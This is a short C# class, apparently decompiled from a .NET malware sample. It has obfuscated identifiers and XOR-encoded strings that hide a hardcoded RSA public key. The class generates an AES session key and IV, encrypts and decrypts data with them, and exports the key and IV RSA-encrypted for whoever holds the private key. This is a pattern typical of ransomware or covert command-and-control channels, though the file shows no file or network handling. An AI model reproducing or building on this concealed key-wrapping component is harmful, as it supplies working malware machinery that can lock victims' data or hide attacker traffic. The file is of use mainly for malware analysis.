using System;
using System.IO;
using System.Security.Cryptography;

internal sealed class ivClqxOl
{
	private readonly byte[] EkUGhyiR;

	private readonly byte[] pLhnorVc;

	public string PruZnHLM
	{
		get
		{
			using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
			RSAParameters parameters = default(RSAParameters);
			string text = "\u0017(\u0005\0";
			string text2 = text;
			string eDhcLlqR = text2;
			string text3 = "VyDBLfRt";
			string vnNtUrJn = text3;
			parameters.Exponent = Convert.FromBase64String(_003CModule_003E.CajLqoCk(eDhcLlqR, vnNtUrJn));
			string text4 = "6#\u001f~&,c?=\u00154%\"\u00134=-@<?2;\u00145h\u001d<\n70\u001f<;@\u001e#\u0019\u001d>9\u001dD5\t[\u0019\u00144.J\u0013:\u0002+\fb<0#.7O\u001d\u0013\u0017\u0018\u0011c\fL\0\u0019#\u0006\u0003\u0010\u0015K'\a\u0017D!\u001c<\" \u0006\t\u0016\u0001%\u00107,\u001914Tq\u001c\u0011~\u001b28%\0@,:1\u0018\u0001?\u0005G-0\u0006\u000f7\"p=\u00123 b\u0012!\u0002#0,\u0010\u001b\"4-:,\u0010\u0002\u0011\0\u0015=\u0011\u001b\u0004\u0002\u0014\07\u001d\0\u001d\u0005|\u001fE3\u001a\u0006, fnXVu";
			string text5 = text4;
			string text6 = text5;
			string eDhcLlqR2 = text6;
			string text7 = "ZsfHtxUW";
			string vnNtUrJn2 = text7;
			parameters.Modulus = Convert.FromBase64String(_003CModule_003E.CajLqoCk(eDhcLlqR2, vnNtUrJn2));
			rSACryptoServiceProvider.ImportParameters(parameters);
			string text8 = Convert.ToBase64String(rSACryptoServiceProvider.Encrypt(EkUGhyiR, fOAEP: true));
			string text9 = "zR[LOGf";
			string eDhcLlqR3 = text9;
			string vnNtUrJn3 = "ZrvabgFb";
			return text8 + _003CModule_003E.CajLqoCk(eDhcLlqR3, vnNtUrJn3) + Convert.ToBase64String(rSACryptoServiceProvider.Encrypt(pLhnorVc, fOAEP: true));
		}
	}

	public ivClqxOl()
	{
		Aes aes = Aes.Create();
		aes.GenerateKey();
		aes.GenerateIV();
		EkUGhyiR = aes.Key;
		pLhnorVc = aes.IV;
	}

	public byte[] rVWZTCXX(byte[] SvyBqJJx)
	{
		using Aes aes = Aes.Create();
		aes.KeySize = 128;
		aes.BlockSize = 128;
		aes.Padding = PaddingMode.Zeros;
		aes.Key = EkUGhyiR;
		aes.IV = pLhnorVc;
		using ICryptoTransform legttFbV = aes.CreateEncryptor(aes.Key, aes.IV);
		return vJpmCiXM(SvyBqJJx, legttFbV);
	}

	public byte[] fWdjkvZy(byte[] vrRRfzvg)
	{
		using Aes aes = Aes.Create();
		aes.KeySize = 128;
		aes.BlockSize = 128;
		aes.Padding = PaddingMode.Zeros;
		aes.Key = EkUGhyiR;
		aes.IV = pLhnorVc;
		using ICryptoTransform legttFbV = aes.CreateDecryptor(aes.Key, aes.IV);
		return vJpmCiXM(vrRRfzvg, legttFbV);
	}

	private byte[] vJpmCiXM(byte[] OjuTSuMz, ICryptoTransform LegttFbV)
	{
		using MemoryStream memoryStream = new MemoryStream();
		using CryptoStream cryptoStream = new CryptoStream(memoryStream, LegttFbV, CryptoStreamMode.Write);
		cryptoStream.Write(OjuTSuMz, 0, OjuTSuMz.Length);
		cryptoStream.FlushFinalBlock();
		return memoryStream.ToArray();
	}
}
